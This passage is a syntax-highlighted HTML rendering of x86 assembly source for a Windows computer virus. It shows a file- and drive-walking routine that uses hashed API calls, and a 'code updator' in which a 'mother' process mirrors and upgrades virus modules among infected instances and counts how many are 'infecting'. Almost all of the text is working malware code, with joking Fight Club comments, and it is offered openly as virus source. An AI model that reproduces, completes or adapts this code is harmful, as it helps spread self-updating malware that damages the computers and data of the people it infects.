</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; load the handle</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; load the buffer</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">Fapicall</span><span class="sc0">    </span><span class="sc2">0E5FAADCFh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">kk232</span><span class="sc0">  </span><span class="sc1">; find the file</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AddOneFile</span><span class="sc0">          </span><span class="sc1">; we reached the last file ?</span><span class="sc0">

</span><span class="sc5">goupdirnow</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">gonextdir</span><span class="sc0">

</span><span class="sc5">changedrive</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">Fapicall</span><span class="sc0">    </span><span class="sc2">0986B615h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">kk259</span><span class="sc0">       </span><span class="sc1">; GetDriveTypeA</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; never talk of project mayhem</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">testtwo</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">],</span><span class="sc12">':C'</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">skipinitfile</span><span class="sc0">

</span><span class="sc5">testtwo</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">andloadfile</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">andloadfile</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">changedrive</span><span class="sc0">

</span><span class="sc5">gonextdir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Fapicall</span><span class="sc0">    </span><span class="sc2">0A8793DEAh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">kk290</span><span class="sc0">          </span><span class="sc1">; FindClose</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">decitagain</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc13">'\'          ; say it, say it
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">decitagain</span><span class="sc0">              </span><span class="sc1">; I'm tyler durden!</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; code updator -</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Work by the following method</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       1ø tell mother to create a mirror of his own module images</span><span class="sc0">
</span><span class="sc1">;       2ø Send Genetic map of client (module version codes)</span><span class="sc0">
</span><span class="sc1">;       3ø (if) mother call bee to upgrade selected code to mirror</span><span class="sc0">
</span><span class="sc1">;       4ø when no virus is dropped, then the mother flush the </span><span class="sc0">
</span><span class="sc1">;          mirror modules to the virus image</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; mirror is created at bank #34 and flushed to bank #33 wich normally are </span><span class="sc0">
</span><span class="sc1">; unexistant, but you can play with them if you want, well, you have to </span><span class="sc0">
</span><span class="sc1">; respect a small structure, if u want to deal, see yourself comment at </span><span class="sc0">
</span><span class="sc1">; Updated function</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       isn't that a funky world ? </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Shared functions: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   void updatorrestart : Repair from a crash during updating</span><span class="sc0">
</span><span class="sc1">;   void CheckUpdated : Server check while connecting of client</span><span class="sc0">
</span><span class="sc1">;   void LoadModulePointer : Load the Module in the update</span><span class="sc0">
</span><span class="sc1">;   void LoadUpdateVersion : Init/Create the updating value</span><span class="sc0">
</span><span class="sc1">;   void FlushModule : Write to Dropped image</span><span class="sc0">
</span><span class="sc1">;   void GetUserValue : See how much hinstances are infecting</span><span class="sc0">
</span><span class="sc1">;   void SetUserValue : Set how much hinstances are infecting</span><span class="sc0">
</span><span class="sc1">;   void incuservalue : Inc the amount of hinstances are infection</span><span class="sc0">
</span><span class="sc1">;   void decuservalue : Dec the amount of hinstances are infection</span><span class="sc0">
</span><span class="sc1">;   void DirectUpdate : Update directly to a module (To be shared with mod)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">updatorrestart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BuildModulesImage</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">LoadModulePointer</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">modulesize</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CheckUpdated</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; This call the server to check</span><span class="sc0">
                    </span><span class="sc1">; if each the remote virus have</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">BuildModulesImage</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">LoadUpdateVersion</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc5">VersionDirty</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">up56</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">getnextbla99</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">getnext55</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_UPDATE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0FBAC7F60h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; SendMessageA</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">getnext55</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getnextbla99</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">LoadUpdateVersion</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">; the mum will update himself</span><span class="sc0">
                    </span><span class="sc1">; to the memory area</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                  

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">              </span><span class="sc1">; load the Swap module bank </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">      </span><span class="sc1">; check that it's was init.</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skipbankinfoit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">      </span><span class="sc1">; not ? init it!</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; reset the aldorflag</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load Dropped Virus image bank</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; set it to edx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc5">PointerTable</span><span class="sc4">-</span><span class="sc5">VirusStart</span><span class="sc4">)+</span><span class="sc2">12</span><span class="sc0"> </span><span class="sc1">; we seek to kernel pointer table</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; point to the module tables</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; set null the module counter</span><span class="sc0">

</span><span class="sc5">getthis95</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get module offset</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc5">modulenumber</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; from end of kernel</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load size</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; repz  it</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">modulesize</span><span class="sc0">          </span><span class="sc1">; add modulesize</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; increment it</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc0">        </span><span class="sc1">; we did all the counter ? </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getthis95</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; then load the module val</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; set as updated/loaded</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">skipbankinfoit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">UpdateThisModule</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">              </span><span class="sc1">; load the Swap module bank </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; set the bank pos</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">      </span><span class="sc1">; Check if it's coherent</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipupdatingit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; save edx place</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Set the start of the needed info</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">modulesize</span><span class="sc0">          
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; load the offset of it</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; load the offset of the mirror</span><span class="sc0">
                    </span><span class="sc1">; of module x</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load the virus-module images</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">PointerTable</span><span class="sc4">-</span><span class="sc5">VirusStart</span><span class="sc4">)+</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc1">; we seek to kernel pointer table</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get module offset</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc5">modulenumber</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; from end of kernel</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load module size</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy it to buffer</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

